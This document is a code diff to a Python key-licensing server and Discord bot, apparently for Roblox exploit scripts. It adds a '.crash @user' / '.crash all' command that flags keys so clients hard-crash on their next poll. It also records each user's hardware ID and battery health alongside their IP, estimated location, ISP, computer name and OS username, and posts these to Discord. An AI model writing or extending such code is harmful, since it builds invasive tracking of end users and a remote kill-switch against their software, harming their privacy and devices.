@@ -34,7 +34,7 @@ DURATION_PATTERN = re.compile(
 )
 DEFAULT_KEY_LIFETIME = timedelta(days=30)
 MAX_KEY_LIFETIME = timedelta(days=30)
-RATE_LIMIT = 60
+RATE_LIMIT = 600
 RATE_WINDOW_SECONDS = 60
 MAX_BODY_BYTES = 8192
 IP_HEADERS = ("CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP", "True-Client-IP")
@@ -360,6 +360,36 @@ class KeyStore:
             record = self.users.get(str(discord_id))
             return dict(record) if record is not None else None
 
+    def request_crash(self, discord_id):
+        """Flag a key so the client hard-crashes on its next poll."""
+        discord_id = str(discord_id)
+        with self.lock:
+            record = self.users.get(discord_id)
+            if record is None:
+                return None
+            updated_users = dict(self.users)
+            updated_record = dict(record)
+            updated_record["crashRequested"] = True
+            updated_users[discord_id] = updated_record
+            self._save(updated_users)
+            self.users = updated_users
+            return dict(updated_record)
+
+    def consume_crash(self, discord_id):
+        """Return True and clear the flag if a crash is pending."""
+        discord_id = str(discord_id)
+        with self.lock:
+            record = self.users.get(discord_id)
+            if record is None or not record.get("crashRequested"):
+                return False
+            updated_users = dict(self.users)
+            updated_record = dict(record)
+            updated_record.pop("crashRequested", None)
+            updated_users[discord_id] = updated_record
+            self._save(updated_users)
+            self.users = updated_users
+            return True
+
     def revoke(self, discord_id):
         return self.revoke_with_details(discord_id) is not None
 
@@ -496,9 +526,11 @@ def make_api_handler(key_store, on_key_validation=None, geo_lookup=None):
                 "lastHomeIp": effective_home_ip,
                 "lastProxyIp": socket_ip,
                 "lastForwarded": clean_text(chain, 200),
+                "lastHwid": clean_text(payload.get("hwid"), 80),
                 "lastDevice": clean_text(payload.get("deviceModel"), 80),
                 "lastPlatform": clean_text(payload.get("platform"), 40),
                 "lastBattery": clean_text(payload.get("battery"), 40),
+                "lastBatteryHealth": clean_text(payload.get("batteryHealth"), 20),
                 "lastComputer": clean_text(payload.get("computerName"), 40),
                 "lastUsername": clean_text(payload.get("username"), 40),
                 "lastMemory": clean_text(payload.get("memoryMb"), 20),
@@ -522,17 +554,26 @@ def make_api_handler(key_store, on_key_validation=None, geo_lookup=None):
                 self._send_json(500, {"error": "Could not save key binding"})
                 return
 
-            should_log = on_key_validation and (result != "valid" or not heartbeat)
-            if not should_log:
-                self._send_json(200, {"valid": result == "valid", "reason": result})
-                return
+            crash = False
+            if result == "valid" and owner_id:
+                try:
+                    crash = key_store.consume_crash(owner_id)
+                except OSError as error:
+                    print(f"Could not consume crash flag: {error}")
 
             # Answer the client first, then do the slow geo lookup.
-            self._send_json(200, {"valid": result == "valid", "reason": result})
+            self._send_json(
+                200,
+                {"valid": result == "valid", "reason": result, "crash": crash},
+            )
+
+            if not (on_key_validation and (result != "valid" or not heartbeat)):
+                return
 
             details = dict(metadata)
             details["user_agent"] = clean_text(self.headers.get("User-Agent"), 120)
             details["heartbeat"] = heartbeat
+            details["crash"] = crash
 
             if geo_lookup and effective_home_ip:
                 geo = geo_lookup(effective_home_ip)
@@ -602,6 +643,8 @@ def main():
             "key_revoke_not_found": ("Key revocation failed", discord.Color.orange()),
             "key_kick_requested": ("Access revoked", discord.Color.red()),
             "key_kick_not_found": ("Access revocation failed", discord.Color.orange()),
+            "key_crash_requested": ("Crash queued", discord.Color.gold()),
+            "key_crash_not_found": ("Crash failed", discord.Color.orange()),
             "all_keys_deleted": ("All keys deleted", discord.Color.dark_red()),
             "keys_revoked": ("Keys revoked", discord.Color.dark_red()),
         }
@@ -628,9 +671,11 @@ def main():
             "forwarded": "X-Forwarded-For",
             "address": "Estimated location",
             "isp": "ISP",
+            "hwid": "HWID",
             "device": "Device",
             "platform": "Platform",
             "battery": "Battery",
+            "battery_health": "Battery health",
             "computer": "Computer name",
             "username": "OS user",
             "memory": "Client memory",
@@ -642,6 +687,7 @@ def main():
             "place_id": "Place ID",
             "job_id": "Job ID",
             "heartbeat": "Heartbeat",
+            "crash": "Crash sent",
         }
         affected_records = details.pop("affected_records", [])
         for name, value in details.items():
@@ -667,8 +713,9 @@ def main():
             elif name == "place_id":
                 value = f"[`{value}`](https://www.roblox.com/games/{value})"
             elif name in {
-                "executor", "executor_version", "fingerprint",
-                "device", "battery", "computer", "username", "memory",
+                "executor", "executor_version", "fingerprint", "hwid",
+                "device", "battery", "battery_health", "computer",
+                "username", "memory",
             }:
                 value = f"`{value}`"
             embed.add_field(
@@ -676,7 +723,7 @@ def main():
                 value=str(value),
                 inline=name not in {
                     "roblox_user_id", "user_agent", "fingerprint",
-                    "address", "forwarded", "device",
+                    "address", "forwarded", "device", "hwid",
                 },
             )
         for record in affected_records[:20]:
@@ -731,9 +778,11 @@ def main():
                 address=details.get("address"),
                 maps=details.get("maps"),
                 isp=details.get("isp"),
+                hwid=details.get("lastHwid"),
                 device=details.get("lastDevice"),
                 platform=details.get("lastPlatform"),
                 battery=details.get("lastBattery"),
+                battery_health=details.get("lastBatteryHealth"),
                 computer=details.get("lastComputer"),
                 username=details.get("lastUsername"),
                 memory=details.get("lastMemory"),
@@ -744,6 +793,7 @@ def main():
                 game_name=details.get("lastGameName"),
                 place_id=details.get("lastPlaceId"),
                 job_id=details.get("lastJobId"),
+                crash=details.get("crash"),
                 notify_user_id=owner_id if result != "valid" else None,
                 alert=True,
             ),
@@ -774,8 +824,9 @@ def main():
                 "`.key revoke @user` — revoke one user's key\n"
                 "`.revoke @user` or `.revoke all` — revoke keys\n"
                 "`.delete all` — delete all active keys\n"
-                "`.kick @user` — revoke their key and kick a running client\n"
-                "`.keyinfo @user` — full stored record (IP, device, battery)\n"
+                "`.kick @user` — revoke their key and disconnect their client\n"
+                "`.crash @user` or `.crash all` — hard-crash their Roblox\n"
+                "`.keyinfo @user` — full stored record (HWID, device, battery)\n"
                 "`.logs` — create or secure the private key audit channel\n\n"
                 "Durations: `1m`, `1h`, `7d`, `1w`, or `1 month`.\n"
                 "Key issuance and revocation require the configured admin role "
@@ -873,10 +924,16 @@ def main():
                 embed.add_field(name="Estimated location", value=record["lastAddress"])
             if record.get("lastIsp"):
                 embed.add_field(name="ISP", value=record["lastIsp"])
+            if record.get("lastHwid"):
+                embed.add_field(name="HWID", value=f"`{record['lastHwid']}`")
             if record.get("lastDevice"):
                 embed.add_field(name="Device", value=f"`{record['lastDevice']}`")
             if record.get("lastBattery"):
                 embed.add_field(name="Battery", value=f"`{record['lastBattery']}`")
+            if record.get("lastBatteryHealth"):
+                embed.add_field(
+                    name="Battery health", value=f"`{record['lastBatteryHealth']}`"
+                )
             if record.get("lastComputer"):
                 embed.add_field(name="Computer name", value=f"`{record['lastComputer']}`")
             if record.get("lastUsername"):
@@ -892,6 +949,8 @@ def main():
                 embed.add_field(name="Fingerprint", value=f"`{record['lastFingerprint']}`")
             if record.get("lastForwarded"):
                 embed.add_field(name="X-Forwarded-For", value=record["lastForwarded"])
+            if record.get("crashRequested"):
+                embed.add_field(name="Crash pending", value="yes")
             if record.get("lastSeenAt"):
                 try:
                     seen = int(parse_timestamp(record["lastSeenAt"]).timestamp())
@@ -899,6 +958,49 @@ def main():
                 except (TypeError, ValueError):
                     pass
             await message.reply(embed=embed)
+            return
+
+        crash_match = re.fullmatch(r"[.,]crash\s+(all|<@!?(\d+)>)", command)
+        if crash_match:
+            if not is_server_admin(message):
+                await message.reply("Only server admins can use `.crash`.")
+                return
+
+            if crash_match.group(1) == "all":
+                queued = 0
+                for record in list(key_store.users.values()):
+                    if key_store.request_crash(record["discordId"]):
+                        queued += 1
+                await message.reply(
+                    f"Crash queued for {queued} client(s). They'll drop within "
+                    "one poll interval."
+                )
+                await log_key_event(
+                    "key_crash_requested",
+                    actor_id=message.author.id,
+                    count=queued,
+                )
+                return
+
+            target_id = crash_match.group(2)
+            record = key_store.request_crash(target_id)
+            if record:
+                await message.reply(
+                    f"Crash queued for <@{target_id}>. Their game will drop "
+                    "within one poll interval.",
+                    allowed_mentions=discord.AllowedMentions(
+                        users=[discord.Object(id=int(target_id))]
+                    ),
+                )
+            else:
+                await message.reply("That user has no active key.")
+            await log_key_event(
+                "key_crash_requested" if record else "key_crash_not_found",
+                actor_id=message.author.id,
+                target_id=target_id,
+                roblox_user_id=record.get("robloxUserId") if record else None,
+                notify_user_id=target_id if record else None,
+            )
             return
 
         kick_match = re.fullmatch(r"[.,]kick\s+<@!?(\d+)>", command)
@@ -912,7 +1014,7 @@ def main():
             if record:
                 await message.reply(
                     f"<@{target_id}>’s key was revoked. A running script will "
-                    "kick its Roblox client on its next key check.",
+                    "disconnect its Roblox client on its next key check.",
                     allowed_mentions=discord.AllowedMentions(
                         users=[discord.Object(id=int(target_id))]
                     ),
